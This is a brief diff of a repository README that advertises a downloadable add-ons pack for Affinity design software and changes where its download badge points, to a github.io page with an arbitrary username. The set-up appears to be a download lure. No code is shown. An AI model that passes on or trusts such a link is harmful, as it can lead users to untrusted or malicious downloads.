@@ -2,7 +2,7 @@
 
 This repository provides a step-by-step offline installation guide for **Affinity Designer**, **Affinity Photo**, and **Affinity Publisher** add-ons — including brushes, assets, styles, and templates.
 
-[![Download Add-Ons Pack](https://img.shields.io/badge/Download-Add--Ons_Pack-blueviolet)](https://affinity-add-ons-pack-download.github.io/.github)
+[![Download Add-Ons Pack](https://img.shields.io/badge/Download-Add--Ons_Pack-blueviolet)](https://matookfj.github.io/.github/affinityaddonspack)
 
 ---
 
